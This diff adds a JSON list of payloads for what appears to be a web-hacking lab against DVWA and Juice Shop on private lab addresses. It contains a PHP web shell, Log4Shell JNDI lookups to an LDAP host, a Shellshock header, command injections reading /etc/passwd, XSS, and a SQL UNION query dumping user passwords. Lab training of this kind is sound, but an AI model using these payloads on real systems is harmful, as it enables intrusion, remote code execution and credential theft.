@@ -1,0 +1,67 @@
+[
+  {
+    "file": "B07-01-hosts.txt",
+    "text": "192.168.0.107 dvwa.ccc.com juice.ccc.com",
+    "where": "Windows · hosts 파일"
+  },
+  {
+    "file": "F07-webshell.txt",
+    "text": "<?php\nif (isset($_GET['cmd'])) {\n    system($_GET['cmd']);\n}",
+    "where": "kt66-web · Vim 파일 내용"
+  },
+  {
+    "file": "B07-02-webshell.txt",
+    "text": "http://192.168.0.107/uploads/shell.php?cmd=id",
+    "where": "Windows · 브라우저 주소창"
+  },
+  {
+    "file": "B07-03-jndi-agent.txt",
+    "text": "${jndi:ldap://192.168.0.108:1389/a}",
+    "where": "Windows · Network conditions · User-Agent"
+  },
+  {
+    "file": "B07-04-jndi-url.txt",
+    "text": "http://dvwa.ccc.com/?q=%24%7Bjndi%3Aldap%3A%2F%2F192.168.0.108%3A1389%2Fa%7D",
+    "where": "Windows · 브라우저 주소창"
+  },
+  {
+    "file": "B07-05-shellshock-agent.txt",
+    "text": "() { :; }; /bin/bash -c \"id\"",
+    "where": "Windows · Network conditions · User-Agent"
+  },
+  {
+    "file": "B07-06-shellshock-url.txt",
+    "text": "http://juice.ccc.com/cgi-bin/test.cgi",
+    "where": "Windows · 브라우저 주소창"
+  },
+  {
+    "file": "B07-07-command-form.txt",
+    "text": "127.0.0.1; id",
+    "where": "Windows · DVWA Command Injection · 주소 입력란"
+  },
+  {
+    "file": "B07-08-command-juice.txt",
+    "text": "http://juice.ccc.com/rest/track-order/1%3Bid",
+    "where": "Windows · 브라우저 주소창"
+  },
+  {
+    "file": "B07-09-command-dvwa.txt",
+    "text": "http://dvwa.ccc.com/vulnerabilities/exec/?ip=127.0.0.1%7Ccat%20/etc/passwd",
+    "where": "Windows · 브라우저 주소창"
+  },
+  {
+    "file": "B07-10-xss.txt",
+    "text": "http://juice.ccc.com/?q=%3Cscript%3Ealert(1)%3C/script%3E",
+    "where": "Windows · 브라우저 주소창"
+  },
+  {
+    "file": "B07-11-union.txt",
+    "text": "http://juice.ccc.com/rest/products/search?q=%27))%20UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20Users--",
+    "where": "Windows · 브라우저 주소창"
+  },
+  {
+    "file": "B07-12-error.txt",
+    "text": "http://juice.ccc.com/rest/products/search?q=%271",
+    "where": "Windows · 브라우저 주소창"
+  }
+]
